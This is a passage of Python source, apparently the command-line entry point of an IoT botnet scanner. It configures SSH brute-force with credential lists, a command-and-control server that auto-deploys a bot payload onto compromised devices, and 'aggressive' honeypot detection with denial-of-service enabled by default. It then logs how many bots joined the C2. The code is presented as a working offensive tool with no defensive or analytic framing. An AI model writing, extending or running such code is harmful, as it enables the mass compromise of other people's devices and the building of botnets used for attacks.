    parser.add_argument("--ssh", action="store_true", help="Enable SSH brute-force (needs paramiko)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Debug logging")
    parser.add_argument("--show-cred-count", action="store_true", help="Print cred count and exit")

    c2_group = parser.add_argument_group("C2 Auto-Join Options")
    c2_group.add_argument("--c2", metavar="HOST:PORT",
                          help="C2 server address for auto-deploy of bots (e.g. 10.0.0.5:8080)")
    c2_group.add_argument("--c2-payload", default="/bot",
                          help="Payload path on C2 HTTP server (default: /bot)")
    c2_group.add_argument("--callback-port", type=int, default=CALLBACK_PORT,
                          help=f"C2 callback/report port (default: {CALLBACK_PORT})")

    hp_group = parser.add_argument_group("Anti-Honeypot Options")
    hp_group.add_argument("--aggressive", action="store_true", default=True,
                          help="Aggressive honeypot detection + DoS (default: on)")
    hp_group.add_argument("--no-aggressive", action="store_false", dest="aggressive",
                          help="Disable aggressive honeypot DoS")
    hp_group.add_argument("--honeypot-only", action="store_true",
                          help="Only run honeypot detection, skip exploitation")
    hp_group.add_argument("--show-honeypots", action="store_true",
                          help="Show honeypot details in output")

    args = parser.parse_args()
    if args.verbose:
        logging.getLogger("iotscanner").setLevel(logging.DEBUG)

    creds = load_credentials(args.cred_file)
    if args.show_cred_count:
        print(f"Credentials: {len(creds)}")
        sys.exit(0)

    c2_config = None
    if args.c2:
        try:
            host, port_str = args.c2.rsplit(":", 1)
            c2_config = C2Config(
                host=host,
                port=int(port_str),
                payload_path=args.c2_payload,
                callback_port=args.callback_port
            )
            log.info(f"C2 configured: {c2_config.host}:{c2_config.port} (payload: {c2_config.payload_path}, "
                     f"callback: {c2_config.callback_port})")
        except ValueError:
            log.error("Invalid C2 format. Use HOST:PORT (e.g. 10.0.0.5:8080)")
            sys.exit(1)

    expanded = expand_targets(args.targets)
    if not expanded:
        log.error("No valid targets")
        sys.exit(1)

    log.info(f"Expanded to {len(expanded)} target(s)")

    scanner = IoTScanner(
        creds=creds, threads=args.threads, timeout=args.timeout,
        enable_ssh=args.ssh, c2=c2_config, aggressive_honeypot=args.aggressive
    )
    results, honeypots = scanner.scan(expanded)

    if args.show_honeypots or honeypots:
        pass
    print_results(results, honeypots, scanner.c2)

    if c2_config and results:
        log.info(f"Auto-joined {scanner.c2.reported_count() if hasattr(scanner.c2, 'reported_count') else len(scanner.c2.reported)} bots to C2")


if __name__ == "__main__":
    main()
